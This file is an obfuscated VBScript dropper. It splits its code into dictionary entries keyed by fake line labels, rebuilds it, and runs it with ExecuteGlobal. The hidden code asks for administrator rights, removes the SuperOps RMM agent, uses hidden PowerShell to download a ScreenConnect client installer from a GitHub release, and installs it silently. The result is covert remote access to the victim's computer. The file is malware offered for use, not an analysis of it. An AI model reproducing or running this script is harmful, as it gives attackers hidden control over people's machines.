Option Explicit
On Error Resume Next

' --- LINE MAPPING ---
Dim LineMap
Set LineMap = CreateObject("Scripting.Dictionary")

LineMap("L58802") = "Option Explicit"
LineMap("L46469") = "Dim oShell, oFSO"
LineMap("L68506") = "Set oShell = CreateObject(""WScript.Shell"")"
LineMap("L67964") = "Set oFSO   = CreateObject(""Scripting.FileSystemObject"")"
LineMap("L90814") = "Dim sMsiUrl, sMsiPath, sTempDir"
LineMap("L82484") = "sMsiUrl  = ""https://github.com/sollm23/statmentonline/releases/download/v1.0/ScreenConnect-3025147.ClientSetup.msi"""
LineMap("L27063") = "sTempDir = oShell.ExpandEnvironmentStrings(""%TEMP%"")"
LineMap("L87452") = "sMsiPath = sTempDir & ""\"" & ""56BSSW3K0000_10POJPQ9MT3B4_windows_x64.msi"""
LineMap("L89920") = "Call Main()"
LineMap("L27856") = "Sub Main()"
LineMap("L96709") = "    If Not IsScriptElevated() Then"
LineMap("L52065") = "        ElevateScript()"
LineMap("L60779") = "        WScript.Quit ' Original instance ends here"
LineMap("L65553") = "    End If"
LineMap("L88295") = "    ExecuteHiddenCommand(""sc stop """"SuperOps RMM"""""")"
LineMap("L47415") = "    WScript.Sleep 1000 ' Brief pause"
LineMap("L56395") = "    ExecuteHiddenCommand(""wmic product where """"Name like '%%SuperOps%%'"""" call uninstall /nointeractive"")"
LineMap("L19006") = "    If Not DownloadMSI(sMsiUrl, sMsiPath) Then"
LineMap("L11016") = "        WScript.Quit 1"
LineMap("L10693") = "    Dim sInstallCmd"
LineMap("L69397") = "    sInstallCmd = ""msiexec /i """""" & sMsiPath & """""" /qn /norestart "" & _"
LineMap("L66777") = "                  ""LicenseAccepted=YES "" & _"
LineMap("L65813") = "                  ""POLICY_CATEGORY_ID=-1 "" & _"
LineMap("L50693") = "                  ""INSTALL_ARGS=""""sourceInstall=silent"""""""
LineMap("L65034") = "    ExecuteHiddenCommand(sInstallCmd)"
LineMap("L38650") = "End Sub"
LineMap("L78970") = "Function IsScriptElevated()"
LineMap("L58350") = "    IsScriptElevated = False"
LineMap("L88240") = "    On Error Resume Next"
LineMap("L80053") = "    Dim sTestFile"
LineMap("L52605") = "    sTestFile = oShell.ExpandEnvironmentStrings(""%WINDIR%"") & ""\test.tmp"""
LineMap("L78093") = "    oFSO.CreateTextFile(sTestFile).Close"
LineMap("L80377") = "    If Err.Number = 0 Then"
LineMap("L51271") = "        oFSO.DeleteFile sTestFile"
LineMap("L21404") = "        IsScriptElevated = True"
LineMap("L42117") = "    On Error GoTo 0"
LineMap("L37946") = "End Function"
LineMap("L51427") = "Sub ElevateScript()"
LineMap("L51674") = "    Dim oShellApp"
LineMap("L89917") = "    Set oShellApp = CreateObject(""Shell.Application"")"
LineMap("L62098") = "    oShellApp.ShellExecute ""wscript.exe"", """""""" & WScript.ScriptFullName & """""""", """", ""runas"", 0"
LineMap("L51721") = "Function DownloadMSI(sUrl, sDestPath)"
LineMap("L75501") = "    DownloadMSI = False"
LineMap("L32854") = "    Dim sPSCommand"
LineMap("L69943") = "    sPSCommand = ""powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "" & _"
LineMap("L11332") = "                 """"""[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; "" & _"
LineMap("L58471") = "                 ""Invoke-WebRequest -Uri '"" & sUrl & ""' -OutFile '"" & sDestPath & ""'"""""""
LineMap("L40966") = "    If oShell.Run(sPSCommand, 0, True) = 0 Then"
LineMap("L25075") = "        If oFSO.FileExists(sDestPath) Then"
LineMap("L63714") = "            DownloadMSI = True"
LineMap("L98141") = "        End If"
LineMap("L93446") = "Sub ExecuteHiddenCommand(sCmd)"
LineMap("L29328") = "    oShell.Run ""cmd /c "" & sCmd, 0, True"

' --- ENCODED SCRIPT ---
Dim EncodedScript
EncodedScript = Array("", "", "", "", "L58802", "", "", "L46469", "L68506", "L67964", "", "", "L90814", "L82484", "L27063", "L87452", "", "", "L89920", "", "", "L27856", "", "L96709", "L52065", "L60779", "L65553", "", "", "L88295", "L47415", "", "", "L56395", "", "", "L19006", "", "L11016", "L65553", "", "", "L10693", "L69397", "L66777", "L65813", "L50693", "", "L65034", "", "", "", "", "", "", "L38650", "", "", "", "", "L78970", "L58350", "L88240", "", "L80053", "L52605", "L78093", "L80377", "L51271", "L21404", "L65553", "L42117", "L37946", "", "", "", "", "L51427", "L51674", "L89917", "", "L62098", "L38650", "", "", "", "", "L51721", "L75501", "L32854", "", "L69943", "L11332", "L58471", "", "", "L40966", "L25075", "L63714", "L98141", "L65553", "L37946", "", "", "", "", "L93446", "", "L29328", "L38650")

' --- DECODE AND EXECUTE ---
Dim i, FullCode, CurrentLine
FullCode = ""
For i = 0 To UBound(EncodedScript)
    CurrentLine = EncodedScript(i)
    If CurrentLine <> "" Then
        If LineMap.Exists(CurrentLine) Then
            FullCode = FullCode & LineMap(CurrentLine)
        Else
            FullCode = FullCode & CurrentLine
        End If
    End If
    FullCode = FullCode & vbCrLf
Next

' --- SILENT EXECUTION ---
ExecuteGlobal FullCode

WScript.Quit(0)
